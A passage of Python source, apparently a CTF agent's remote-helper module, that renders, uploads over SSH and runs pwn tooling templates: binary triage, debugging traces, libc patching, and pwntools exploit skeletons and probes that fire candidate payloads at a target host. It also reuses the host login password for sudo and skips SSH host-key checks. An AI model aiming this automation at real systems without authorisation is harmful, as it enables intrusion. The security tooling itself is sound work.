                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_input_bruteforce_lite.py",
                    "content": self._render_input_runner_template(mode="pwn", payload=payload),
                    "summary": "Run a bounded candidate-input loop for pwn-style binaries.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [sample_path, binary_name, json.dumps(candidate_inputs, ensure_ascii=False)],
                    "variables": {
                        "sample_path": sample_path,
                        "binary_name": binary_name,
                        "candidate_inputs": candidate_inputs,
                        "target_symbol": payload["target_symbol"],
                        "rop_hints": payload["rop_hints"],
                        "probe_summary": payload["probe_summary"],
                    },
                }
            if kind == "pwn-env-doctor":
                sample_path = str(variables.get("sample_path") or "").strip()
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwn_env_doctor.py",
                    "content": self._render_pwn_env_doctor_template(),
                    "summary": "Report pwn tooling parity, Python modules, and bootstrap hints on the remote helper.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [sample_path],
                    "variables": {"sample_path": sample_path},
                }
            if kind == "pwn-ubuntu-bootstrap":
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwn_ubuntu_bootstrap.py",
                    "content": self._render_pwn_ubuntu_bootstrap_template(),
                    "summary": "Explicitly bootstrap an Ubuntu/Debian-like helper into a stronger pwn workstation profile.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [],
                    "variables": {},
                }
            if kind == "pwn-kali-bootstrap":
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwn_kali_bootstrap.py",
                    "content": self._render_pwn_kali_bootstrap_template(),
                    "summary": "Explicitly bootstrap a Kali/Debian-like VMware helper into a Linux pwn build/debug box.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [],
                    "variables": {},
                }
            if kind == "pwn-gdbserver-launch":
                sample_path = str(variables.get("sample_path") or "").strip()
                listen_port = int(variables.get("listen_port") or 31337)
                program_args = list(variables.get("program_args") or [])
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwn_gdbserver_launch.py",
                    "content": self._render_pwn_gdbserver_launch_template(),
                    "summary": "Launch gdbserver for a remote binary and emit pid/log metadata.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [sample_path, str(listen_port), json.dumps(program_args, ensure_ascii=False)],
                    "variables": {"sample_path": sample_path, "listen_port": listen_port, "program_args": program_args},
                }
            if kind == "pwn-qemu-run":
                sample_path = str(variables.get("sample_path") or "").strip()
                qemu_bin = str(variables.get("qemu_bin") or "").strip()
                binary_args = list(variables.get("binary_args") or [])
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwn_qemu_run.py",
                    "content": self._render_pwn_qemu_run_template(),
                    "summary": "Run a foreign-arch sample under qemu-user and capture stdout/stderr.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [sample_path, qemu_bin, json.dumps(binary_args, ensure_ascii=False)],
                    "variables": {"sample_path": sample_path, "qemu_bin": qemu_bin, "binary_args": binary_args},
                }
            if kind == "pwn-build-native":
                payload = {
                    "source_dir": str(variables.get("source_dir") or "").strip(),
                    "build_dir": str(variables.get("build_dir") or "").strip(),
                    "binary_name": str(variables.get("binary_name") or "chall").strip() or "chall",
                    "sources": list(variables.get("sources") or []),
                    "cflags": list(variables.get("cflags") or []),
                    "ldflags": list(variables.get("ldflags") or []),
                }
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwn_build_native.py",
                    "content": self._render_pwn_build_template(mode="native"),
                    "summary": "Compile Linux ELF sources remotely and emit a structured build result.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [json.dumps(payload, ensure_ascii=False)],
                    "variables": payload,
                }
            if kind == "pwn-build-multilib":
                payload = {
                    "source_dir": str(variables.get("source_dir") or "").strip(),
                    "build_dir": str(variables.get("build_dir") or "").strip(),
                    "binary_name": str(variables.get("binary_name") or "chall32").strip() or "chall32",
                    "sources": list(variables.get("sources") or []),
                    "cflags": list(variables.get("cflags") or []),
                    "ldflags": list(variables.get("ldflags") or []),
                }
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwn_build_multilib.py",
                    "content": self._render_pwn_build_template(mode="multilib"),
                    "summary": "Compile 32-bit Linux ELF sources remotely and emit a structured build result.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [json.dumps(payload, ensure_ascii=False)],
                    "variables": payload,
                }
            if kind == "pwn-gdb-batch-trace":
                payload = {
                    "sample_path": str(variables.get("sample_path") or "").strip(),
                    "binary_name": str(variables.get("binary_name") or Path(str(variables.get("sample_path") or "chall")).name),
                    "program_args": list(variables.get("program_args") or []),
                    "stdin_data": str(variables.get("stdin_data") or ""),
                    "gdb_commands": list(variables.get("gdb_commands") or []),
                }
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwn_gdb_batch_trace.py",
                    "content": self._render_pwn_gdb_batch_trace_template(),
                    "summary": "Run one bounded gdb batch trace and emit register/stack/backtrace summaries.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [json.dumps(payload, ensure_ascii=False)],
                    "variables": payload,
                }
            if kind == "pwn-rr-record":
                payload = {
                    "sample_path": str(variables.get("sample_path") or "").strip(),
                    "binary_name": str(variables.get("binary_name") or Path(str(variables.get("sample_path") or "chall")).name),
                    "program_args": list(variables.get("program_args") or []),
                    "stdin_data": str(variables.get("stdin_data") or ""),
                }
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwn_rr_record.py",
                    "content": self._render_pwn_rr_record_template(),
                    "summary": "Record one bounded rr trace and emit the trace directory plus replay hints.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [json.dumps(payload, ensure_ascii=False)],
                    "variables": payload,
                }
            if kind == "pwn-corefile-collect":
                payload = {
                    "sample_path": str(variables.get("sample_path") or "").strip(),
                    "binary_name": str(variables.get("binary_name") or Path(str(variables.get("sample_path") or "chall")).name),
                    "program_args": list(variables.get("program_args") or []),
                    "stdin_data": str(variables.get("stdin_data") or ""),
                }
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwn_corefile_collect.py",
                    "content": self._render_pwn_corefile_collect_template(),
                    "summary": "Run a binary, look for a corefile, and emit crash/file/checksec summaries.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [json.dumps(payload, ensure_ascii=False)],
                    "variables": payload,
                }
            if kind == "pwn-libc-ident":
                payload = {
                    "sample_path": str(variables.get("sample_path") or "").strip(),
                    "libc_path": str(variables.get("libc_path") or "").strip(),
                    "ld_path": str(variables.get("ld_path") or "").strip(),
                    "leaks": list(variables.get("leaks") or []),
                }
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwn_libc_ident.py",
                    "content": self._render_pwn_libc_ident_template(),
                    "summary": "Normalize libc/ld context locally on the helper without external lookups.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [json.dumps(payload, ensure_ascii=False)],
                    "variables": payload,
                }
            if kind == "pwn-regress-build-pack":
                payload = {
                    "output_root": str(variables.get("output_root") or "").strip(),
                    "case_prefix": str(variables.get("case_prefix") or "case-native").strip() or "case-native",
                }
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwn_regress_build_pack.py",
                    "content": self._render_pwn_regress_build_pack_template(),
                    "summary": "Build a minimal real-ELF pwn regression corpus on the remote helper.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [json.dumps(payload, ensure_ascii=False)],
                    "variables": payload,
                }
            if kind == "pwn-libc-setup":
                sample_path = str(variables.get("sample_path") or "").strip()
                libc_path = str(variables.get("libc_path") or "").strip()
                ld_path = str(variables.get("ld_path") or "").strip()
                output_path = str(variables.get("output_path") or (sample_path + ".patched")).strip()
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwn_libc_setup.py",
                    "content": self._render_pwn_libc_setup_template(),
                    "summary": "Patch interpreter / libc context with pwninit or patchelf when available.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [sample_path, libc_path, ld_path, output_path],
                    "variables": {
                        "sample_path": sample_path,
                        "libc_path": libc_path,
                        "ld_path": ld_path,
                        "output_path": output_path,
                    },
                }
            if kind == "pwninit-bootstrap":
                sample_path = str(variables.get("sample_path") or "").strip()
                libc_path = str(variables.get("libc_path") or "").strip()
                ld_path = str(variables.get("ld_path") or "").strip()
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwninit_bootstrap.py",
                    "content": self._render_pwninit_bootstrap_template(),
                    "summary": "Run pwninit if present and report the generated patch outputs.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [sample_path, libc_path, ld_path],
                    "variables": {"sample_path": sample_path, "libc_path": libc_path, "ld_path": ld_path},
                }
            if kind == "one-gadget-check":
                libc_path = str(variables.get("libc_path") or "").strip()
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_one_gadget_check.py",
                    "content": self._render_one_gadget_check_template(),
                    "summary": "Enumerate one_gadget candidates for a libc when the gem is installed.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [libc_path],
                    "variables": {"libc_path": libc_path},
                }
            if kind in {"orw-pwntools-probe", "srop-pwntools-probe", "ret2dlresolve-pwntools-probe", "heap-pwntools-skeleton", "fsop-pwntools-skeleton"}:
                sample_path = str(variables.get("sample_path") or "").strip()
                binary_name = str(variables.get("binary_name") or Path(sample_path or "sample.bin").name)
                target_host = str(variables.get("target_host") or "").strip()
                target_port = int(variables.get("target_port") or 0)
                family_name = str(variables.get("family_name") or "").strip()
                protections = dict(variables.get("protections") or {})
                probe_summary = dict(variables.get("probe_summary") or {})
                candidate_inputs = list(variables.get("candidate_inputs") or [])
                mode_map = {
                    "orw-pwntools-probe": ("orw", "remote_orw_pwntools_probe.py", "Bounded ORW/seccomp probe that emits a pwntools stage-1/stage-2 stub."),
                    "srop-pwntools-probe": ("srop", "remote_srop_pwntools_probe.py", "Bounded SROP probe that emits a pwntools sigreturn stub."),
                    "ret2dlresolve-pwntools-probe": ("ret2dlresolve", "remote_ret2dlresolve_pwntools_probe.py", "Bounded ret2dlresolve probe that emits a pwntools stub."),
                    "heap-pwntools-skeleton": ("heap", "remote_heap_pwntools_skeleton.py", "Heap exploit skeleton with alloc/free/edit/show placeholders."),
                    "fsop-pwntools-skeleton": ("fsop", "remote_fsop_pwntools_skeleton.py", "FSOP exploit skeleton with FILE/vtable placeholders."),
                }
                mode, default_filename, summary = mode_map[kind]
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or default_filename,
                    "content": self._render_pwn_hard_probe_template(mode),
                    "summary": summary,
                    "executable": True,
                    "entrypoint": "python",
                    "args": [
                        sample_path,
                        binary_name,
                        target_host,
                        str(target_port),
                        family_name,
                        json.dumps(protections, ensure_ascii=False),
                        json.dumps(probe_summary, ensure_ascii=False),
                        json.dumps(candidate_inputs, ensure_ascii=False),
                    ],
                    "variables": {
                        "sample_path": sample_path,
                        "binary_name": binary_name,
                        "target_host": target_host,
                        "target_port": target_port,
                        "family_name": family_name,
                        "protections": protections,
                        "probe_summary": probe_summary,
                        "candidate_inputs": candidate_inputs,
                    },
                }
            return {
                "status": "missing",
                "template_kind": kind,
                "message": "unsupported remote template kind",
                "available": [
                    "binary-analysis",
                    "binary-checksec",
                    "fsop-pwntools-skeleton",
                    "heap-pwntools-skeleton",
                    "http-replay",
                    "input-bruteforce-lite",
                    "one-gadget-check",
                    "orw-pwntools-probe",
                    "pwn-build-multilib",
                    "pwn-build-native",
                    "pwn-corefile-collect",
                    "pwn-env-doctor",
                    "pwn-gdb-batch-trace",
                    "pwn-rr-record",
                    "pwn-ubuntu-bootstrap",
                    "pwn-kali-bootstrap",
                    "pwn-gdbserver-launch",
                    "pwn-libc-ident",
                    "pwn-libc-setup",
                    "pwn-qemu-run",
                    "pwn-regress-build-pack",
                    "pwninit-bootstrap",
                    "pwntools",
                    "pwntools-probe",
                    "ret2dlresolve-pwntools-probe",
                    "reverse-runner",
                    "srop-pwntools-probe",
                ],
            }
        except Exception as exc:
            return {
                "status": "error",
                "template_kind": kind,
                "message": str(exc),
                "trace": traceback.format_exc(),
            }

    def stage_template(self, host_name, template_payload, remote_workspace=None, remote_path=None, timeout=30):
        blocked = self._ensure_policy(host_name, "stage_template")
        if blocked:
            return blocked
        if template_payload.get("status") != "ok":
            return dict(template_payload)

        template_path = self._resolve_template_remote_path(
            remote_workspace=remote_workspace,
            filename=template_payload.get("filename", "remote_template.py"),
            remote_path=remote_path,
            host_name=host_name,
        )
        upload = self.upload_text(
            host_name,
            template_payload.get("content", ""),
            remote_path=template_path,
            timeout=timeout,
        )
        upload["template_kind"] = template_payload.get("template_kind", "")
        upload["filename"] = template_payload.get("filename", "")
        return upload

    def run_template(
        self,
        host_name,
        template_kind,
        remote_workspace=None,
        remote_path=None,
        timeout=120,
        cwd=None,
        env=None,
        python_bin=None,
        filename=None,
        **variables
    ):
        blocked = self._ensure_policy(host_name, "run_template")
        if blocked:
            return blocked
        rendered = self.render_template(template_kind, filename=filename, **variables)
        if rendered.get("status") != "ok":
            rendered["host"] = host_name
            return rendered

        staged = self.stage_template(
            host_name,
            rendered,
            remote_workspace=remote_workspace,
            remote_path=remote_path,
            timeout=min(float(timeout), 45.0),
        )
        if staged.get("status") != "ok":
            return {
                "status": staged.get("status", "error"),
                "host": host_name,
                "template_kind": rendered.get("template_kind", ""),
                "render": rendered,
                "stage": staged,
            }

        payload = {
            "status": "ok",
            "host": host_name,
            "template_kind": rendered.get("template_kind", ""),
            "template_path": staged.get("remote_path", ""),
            "render": rendered,
            "stage": staged,
        }
        if not rendered.get("executable"):
            payload["mode"] = "staged"
            return payload

        host = self.hosts.get(host_name)
        chosen_python = python_bin or self._python_bin(host or {})
        command = self._build_template_command(chosen_python, staged.get("remote_path", ""), rendered.get("args", []))
        execute_env = self._build_template_env(host or {}, template_kind, env=env)
        execute = self.run(
            host_name,
            command,
            timeout=timeout,
            cwd=cwd or self._workspace_root_from_value(remote_workspace),
            env=execute_env,
        )
        payload["mode"] = "executed"
        payload["execute"] = self._redact_execute_payload(execute, execute_env)
        payload["status"] = execute.get("status", payload["status"])
        return payload

    def _build_template_env(self, host, template_kind, env=None):
        env_payload = dict(env or {})
        if template_kind in self.BOOTSTRAP_TEMPLATE_KINDS:
            sudo_password = str(env_payload.get("CTF_AGENT_REMOTE_SUDO_PASSWORD") or host.get("password") or "").strip()
            if sudo_password:
                env_payload["CTF_AGENT_REMOTE_SUDO_PASSWORD"] = sudo_password
        return env_payload or None

    def _redact_execute_payload(self, payload, env=None):
        if not isinstance(payload, dict):
            return payload
        sensitive_items = [
            (str(key), str(value))
            for key, value in dict(env or {}).items()
            if value and self._is_sensitive_env_key(key)
        ]
        if not sensitive_items:
            return payload
        redacted = dict(payload)
        for field in ("command", "trace"):
            value = redacted.get(field)
            if not isinstance(value, str):
                continue
            sanitized = value
            for key, secret in sensitive_items:
                sanitized = sanitized.replace("{0}={1}".format(key, shlex.quote(secret)), "{0}=***".format(key))
                sanitized = sanitized.replace("{0}='{1}'".format(key, secret), "{0}=***".format(key))
                sanitized = sanitized.replace("{0}=\"{1}\"".format(key, secret), "{0}=***".format(key))
                sanitized = sanitized.replace("{0}={1}".format(key, secret), "{0}=***".format(key))
            redacted[field] = sanitized
        return redacted

    def _is_sensitive_env_key(self, key):
        lowered = str(key or "").strip().lower()
        return any(token in lowered for token in ["password", "secret", "token", "passphrase", "private_key", "api_key"])

    def _connect(self, host_name, timeout=30):
        host = self.hosts.get(host_name)
        if not host:
            raise ValueError("remote host is not configured: {0}".format(host_name))

        try:
            import paramiko
        except ImportError:
            raise RuntimeError("paramiko is not installed in the active Python environment")

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            hostname=host["host"],
            port=int(host.get("port", 22)),
            username=host["username"],
            password=host.get("password"),
            key_filename=host.get("private_key"),
            passphrase=host.get("passphrase"),
            timeout=timeout,
            banner_timeout=timeout,
            auth_timeout=timeout,
        )
        return client

    def _build_template_command(self, python_bin, remote_script_path, args):
        command_parts = [shlex.quote(str(python_bin or self.DEFAULT_PYTHON)), shlex.quote(str(remote_script_path))]
        for item in list(args or []):
            command_parts.append(shlex.quote(str(item)))
        return " ".join(command_parts)

    def _exec(self, client, command, timeout=30, cwd=None, env=None, host_name=""):
        wrapped = self._wrap_command(command, cwd=cwd, env=env)
        stdin = None
        stdout = None
        stderr = None
        try:
            stdin, stdout, stderr = client.exec_command(wrapped, timeout=timeout)
            stdout_text = stdout.read().decode("utf-8", errors="replace")
            stderr_text = stderr.read().decode("utf-8", errors="replace")
            exit_status = stdout.channel.recv_exit_status()
            return {
                "status": "ok" if exit_status == 0 else "error",
                "host": host_name,
                "command": wrapped,
                "returncode": exit_status,
                "stdout": stdout_text,
                "stderr": stderr_text,
            }
        finally:
            self._close(stdin)
            self._close(stdout)
            self._close(stderr)

    def _exec_python(self, client, python_bin, code, args=None, timeout=60, env=None, cwd=None, host_name=""):
        args = list(args or [])
        command = "{0} - {1}".format(shlex.quote(python_bin), " ".join(shlex.quote(str(item)) for item in args)).strip()
        wrapped = self._wrap_command(command, cwd=cwd, env=env)
        stdin = None
        stdout = None
        stderr = None
        try:
            stdin, stdout, stderr = client.exec_command(wrapped, timeout=timeout)
            stdin.write(code)
            if not code.endswith("\n"):
                stdin.write("\n")
            try:
                stdin.channel.shutdown_write()
            except Exception:
                pass
            stdout_text = stdout.read().decode("utf-8", errors="replace")
            stderr_text = stderr.read().decode("utf-8", errors="replace")
            exit_status = stdout.channel.recv_exit_status()
            return {
                "status": "ok" if exit_status == 0 else "error",
                "host": host_name,
                "python_bin": python_bin,
                "command": wrapped,
                "args": list(args),
                "returncode": exit_status,
                "stdout": stdout_text,
                "stderr": stderr_text,
            }
        finally:
            self._close(stdin)
            self._close(stdout)
            self._close(stderr)

    def _wrap_command(self, command, cwd=None, env=None):
        parts = []
        if cwd:
            parts.append("cd {0}".format(shlex.quote(self._normalize_remote_path(cwd))))
        if env:
            exports = []
            for key, value in dict(env).items():
                exports.append("{0}={1}".format(str(key), shlex.quote(str(value))))
            if exports:
                parts.append("export {0}".format(" ".join(exports)))
        parts.append(command)
        return " && ".join(parts)

    def _render_binary_analysis_template(self):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json
            import os
            import shutil
            import subprocess
            import sys

            if len(sys.argv) < 4:
                raise SystemExit("usage: remote_binary_analysis.py <sample_path> <category> <binary_name>")

            path, category, binary_name = sys.argv[1], sys.argv[2], sys.argv[3]
            payload = {
                "path": path,
                "category": category,
                "binary_name": binary_name,
                "steps": [],
            }

            def run_step(label, cmd, data=None, timeout=8):
                entry = {"label": label, "command": cmd}
                try:
                    completed = subprocess.run(
                        cmd,
                        input=data,
                        capture_output=True,
                        timeout=timeout,
                        text=True,
                    )
                    entry["returncode"] = completed.returncode
                    entry["stdout"] = completed.stdout[:20000]
                    entry["stderr"] = completed.stderr[:12000]
                except Exception as exc:
                    entry["error"] = str(exc)
                payload["steps"].append(entry)

            for tool_name, cmd in [
                ("file", ["file", path]),
                ("readelf-header", ["readelf", "-h", path]),
                ("readelf-symbols", ["readelf", "-s", path]),
                ("ldd", ["ldd", path]),
                ("strings", ["strings", "-n", "4", path]),
            ]:
                if shutil.which(cmd[0]):
                    run_step(tool_name, cmd, timeout=12)

            try:
                st = os.stat(path)
                os.chmod(path, st.st_mode | 0o111)
            except Exception:
                pass

            if category == "pwn" and os.path.isfile(path):
                run_step("sample-run", [path], data="AAAA\\n", timeout=4)

            print(json.dumps(payload, ensure_ascii=False, indent=2))
            """
        )

    def _render_http_replay_template(self, request_spec):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json
            import re
            import time
            import urllib.error
            import urllib.parse
            import urllib.request

            REQUEST_SPEC = {request_spec}
            payload = {{"status": "error", "url": REQUEST_SPEC.get("url", "")}}
            started = time.monotonic()
            try:
                url = REQUEST_SPEC.get("url", "")
                method = (REQUEST_SPEC.get("method") or "GET").upper()
                headers = dict(REQUEST_SPEC.get("headers") or {{}})
                data = dict(REQUEST_SPEC.get("data") or {{}})
                timeout = int(REQUEST_SPEC.get("timeout", 12) or 12)
                max_body_bytes = int(REQUEST_SPEC.get("max_body_bytes", 200000) or 200000)

                body = None
                if method == "GET" and data:
                    query = urllib.parse.urlencode(data, doseq=True)
                    separator = "&" if "?" in url else "?"
                    url = "{{0}}{{1}}{{2}}".format(url, separator, query)
                elif data:
                    body = urllib.parse.urlencode(data, doseq=True).encode("utf-8")
                    headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

                request = urllib.request.Request(url, data=body, headers=headers, method=method)
                with urllib.request.urlopen(request, timeout=timeout) as response:
                    blob = response.read(max_body_bytes)
                    text = blob.decode("utf-8", errors="replace")
                    match = re.search(r"<title[^>]*>(.*?)</title>", text, re.I | re.S)
                    title = re.sub(r"\\s+", " ", match.group(1)).strip()[:200] if match else ""
                    elapsed = time.monotonic() - started
                    payload = {{
                        "status": "ok",
                        "url": response.geturl(),
                        "status_code": getattr(response, "status", None) or response.getcode(),
                        "headers": dict(response.headers.items()),
                        "content_type": response.headers.get("Content-Type", "").lower(),
                        "elapsed": round(float(elapsed), 4),
                        "length": len(text),
                        "title": title,
                        "text": text[:12000],
                    }}
            except urllib.error.HTTPError as exc:
                payload = {{
                    "status": "error",
                    "url": getattr(exc, "url", REQUEST_SPEC.get("url", "")),
                    "status_code": exc.code,
                    "headers": dict(exc.headers.items()) if getattr(exc, "headers", None) else {{}},
                    "error": str(exc),
                }}
            except Exception as exc:
                payload["error"] = str(exc)

            print(json.dumps(payload, ensure_ascii=False))
            """
        ).format(request_spec=repr(dict(request_spec or {})))

    def _render_binary_checksec_template(self):
        template = """\
            #!/usr/bin/env python3
            import json
            import os
            import re
            import shutil
            import subprocess
            import sys

            if len(sys.argv) < 3:
                raise SystemExit("usage: remote_binary_checksec.py <sample_path> <binary_name>")

            path, binary_name = sys.argv[1], sys.argv[2]
            payload = {
                "path": path,
                "binary_name": binary_name,
                "arch": "",
                "bits": "",
                "format": "",
                "protections": {},
                "reports": [],
            }

            def run_step(label, cmd, timeout=10):
                entry = {"label": label, "command": cmd}
                try:
                    completed = subprocess.run(
                        cmd,
                        capture_output=True,
                        timeout=timeout,
                        text=True,
                    )
                    entry["returncode"] = completed.returncode
                    entry["stdout"] = completed.stdout[:12000]
                    entry["stderr"] = completed.stderr[:6000]
                except Exception as exc:
                    entry["error"] = str(exc)
                payload["reports"].append(entry)
                return entry

            def run_checksec(path, timeout=10):
                result = run_step("checksec", ["checksec", "--file", path], timeout=timeout)
                text = ((result.get("stdout") or "") + "\\n" + (result.get("stderr") or "")).lower()
                if "unknown option file" in text or "no option selected" in text:
                    result = run_step("checksec-file-equals", ["checksec", "--file=" + path], timeout=timeout)
                    text = ((result.get("stdout") or "") + "\\n" + (result.get("stderr") or "")).lower()
                    if "unknown option file" in text or "no option selected" in text:
                        result = run_step("checksec-legacy", ["checksec", path], timeout=timeout)
                return result

            if shutil.which("file"):
                result = run_step("file", ["file", path])
                text = (result.get("stdout") or "").lower()
                payload["format"] = text
                if "64-bit" in text:
                    payload["bits"] = "64"
                elif "32-bit" in text:
                    payload["bits"] = "32"
                if "elf" in text:
                    payload["arch"] = "elf"
                elif "pe32" in text or "ms-dos" in text:
                    payload["arch"] = "pe"

            if shutil.which("readelf"):
                header = run_step("readelf-header", ["readelf", "-h", path])
                dynamic = run_step("readelf-dynamic", ["readelf", "-d", path])
                header_text = ((header.get("stdout") or "") + "\\n" + (dynamic.get("stdout") or "")).lower()
                payload["protections"] = {
                    "pie": "dso" in header_text or "type: dyn" in header_text,
                    "nx": "gnu_stack" in header_text,
                    "relro": "relro" in header_text,
                    "canary_hint": "__stack_chk_fail" in header_text,
                }
            else:
                payload["protections"] = {
                    "pie": False,
                    "nx": False,
                    "relro": False,
                    "canary_hint": False,
                }

            print(json.dumps(payload, ensure_ascii=False, indent=2))
            """
        lines = []
        for line in template.splitlines():
            if line.startswith("            "):
                lines.append(line[12:])
            else:
                lines.append(line)
        return "\n".join(lines).lstrip("\n") + "\n"

    def _render_pwntools_template(self, payload):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            from pwn import *

            context.binary = {binary_name!r}
            context.log_level = "debug"

            LOCAL_PATH = {sample_path!r}
            REMOTE_HOST = {target_host!r}
            REMOTE_PORT = {target_port}


            def start():
                if REMOTE_HOST and REMOTE_PORT:
                    return remote(REMOTE_HOST, REMOTE_PORT)
                return process(LOCAL_PATH)


            def main():
                io = start()
                # TODO: fill in exploit chain from notes.md / triage_board.json
                io.interactive()


            if __name__ == "__main__":
                main()
            """
        ).format(
            binary_name=str(payload.get("binary_name") or "chall"),
            sample_path=str(payload.get("sample_path") or "./chall"),
            target_host=str(payload.get("target_host") or ""),
            target_port=int(payload.get("target_port") or 0),
        )

    def _render_pwntools_probe_template(self, payload):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            from pwn import *
            import json

            context.binary = {binary_name!r}
            context.log_level = "debug"

            LOCAL_PATH = {sample_path!r}
            REMOTE_HOST = {target_host!r}
            REMOTE_PORT = {target_port}
            TARGET_SYMBOL = {target_symbol!r}
            CANDIDATE_INPUTS = {candidate_inputs!r}
            ROP_HINTS = {rop_hints!r}
            PROBE_SUMMARY = {probe_summary}
            ANGR_INPUTS = list(PROBE_SUMMARY.get("angr_candidate_inputs") or [])
            RAW_PAYLOAD_LABELS = [str(item.get("label") or "").strip() for item in list(PROBE_SUMMARY.get("raw_payloads") or []) if str(item.get("label") or "").strip()]


            def start():
                if REMOTE_HOST and REMOTE_PORT:
                    return remote(REMOTE_HOST, REMOTE_PORT)
                return process(LOCAL_PATH)


            def _dedupe_inputs(values):
                items = []
                seen = set()
                for value in list(values or []):
                    text = str(value or "").strip()
                    if not text:
                        continue
                    marker = text.lower()
                    if marker in seen:
                        continue
                    seen.add(marker)
                    items.append(text)
                return items


            def _decode_blob(data):
                if isinstance(data, (bytes, bytearray)):
                    return data.decode(errors="replace")
                return str(data or "")


            def _resolve_probe_bytes(value):
                text = str(value or "").strip()
                if text.startswith("RAWPAYLOAD:"):
                    label = text.split(":", 1)[1].strip()
                    for item in list(PROBE_SUMMARY.get("raw_payloads") or []):
                        if str(item.get("label") or "").strip() != label:
                            continue
                        try:
                            import base64
                            return label, base64.b64decode(str(item.get("b64") or "").strip()) + b"\\n"
                        except Exception:
                            break
                return text, str(text).encode() + b"\\n"


            def try_once(value, timeout=0.8):
                io = start()
                transcript = b""
                try:
                    try:
                        transcript += io.recvrepeat(0.2)
                    except EOFError:
                        pass
                    label, payload = _resolve_probe_bytes(value)
                    io.send(payload)
                    try:
                        transcript += io.recvrepeat(timeout)
                    except EOFError:
                        pass
                    return _decode_blob(transcript)
                finally:
                    try:
                        io.close()
                    except Exception:
                        pass


            def quick_try_inputs(values, limit=3):
                attempts = []
                for value in _dedupe_inputs(values)[:limit]:
                    transcript = try_once(value)
                    attempts.append({{"input": value, "transcript": transcript}})
                    print("[*] quick-try:", repr(value))
                    print(transcript[:400])
                    lowered = transcript.lower()
                    if "flag{{" in lowered or "granted" in lowered or "correct" in lowered or "success" in lowered:
                        return attempts, True
                return attempts, False


            def main():
                print("[*] Probe summary:")
                print(json.dumps(PROBE_SUMMARY, ensure_ascii=False, indent=2))
                quick_inputs = _dedupe_inputs(
                    ["RAWPAYLOAD:" + item for item in RAW_PAYLOAD_LABELS]
                    + ANGR_INPUTS
                    + CANDIDATE_INPUTS
                    + ([TARGET_SYMBOL] if TARGET_SYMBOL else [])
                )
                print("[*] Quick probe order:")
                print(json.dumps(quick_inputs[:8], ensure_ascii=False, indent=2))
                print("[*] Suggested priority:")
                print("  1. raw payload labels from remote pwn probe")
                print("  2. angr candidate inputs")
                print("  3. candidate inputs from static and remote probes")
                print("  4. target symbol / ret2win clue")
                print("  5. ROP hints / cyclic pattern")
                attempts, solved = quick_try_inputs(quick_inputs, limit=5 if (ANGR_INPUTS or RAW_PAYLOAD_LABELS) else 2)
                if solved:
                    print("[*] quick-try hit success marker, keeping transcript above as first reproduction chain.")
                    return
                io = start()
                if attempts:
                    print("[*] quick-try did not solve, dropping into interactive mode.")
                io.interactive()


            if __name__ == "__main__":
                main()
            """
        ).format(
            binary_name=str(payload.get("binary_name") or "chall"),
            sample_path=str(payload.get("sample_path") or "./chall"),
            target_host=str(payload.get("target_host") or ""),
            target_port=int(payload.get("target_port") or 0),
            target_symbol=str(payload.get("target_symbol") or ""),
            candidate_inputs=list(payload.get("candidate_inputs") or []),
            rop_hints=list(payload.get("rop_hints") or []),
            probe_summary=json.dumps(dict(payload.get("probe_summary") or {}), ensure_ascii=False, indent=2),
        )

    def _render_input_runner_template(self, mode="reverse", payload=None):
        mode = str(mode or "reverse")
        payload = dict(payload or {})
        template = """\
#!/usr/bin/env python3
import base64
import json
import os
import re
import struct
import subprocess
import sys

if len(sys.argv) < 4:
    raise SystemExit("usage: runner.py <sample_path> <binary_name> <candidate_inputs_json>")

sample_path = sys.argv[1]
binary_name = sys.argv[2]
candidate_inputs = json.loads(sys.argv[3] or "[]")
TARGET_SYMBOL = __TARGET_SYMBOL__
ROP_HINTS = __ROP_HINTS__
PROBE_SUMMARY = __PROBE_SUMMARY__
payload = {
    "mode": __MODE__,
    "sample_path": sample_path,
    "binary_name": binary_name,
    "attempts": [],
    "candidate_flags": [],
    "probe_summary": PROBE_SUMMARY,
}

try:
    st = os.stat(sample_path)
    os.chmod(sample_path, st.st_mode | 0o111)
except Exception:
    pass

expanded_inputs = []
seen = set()
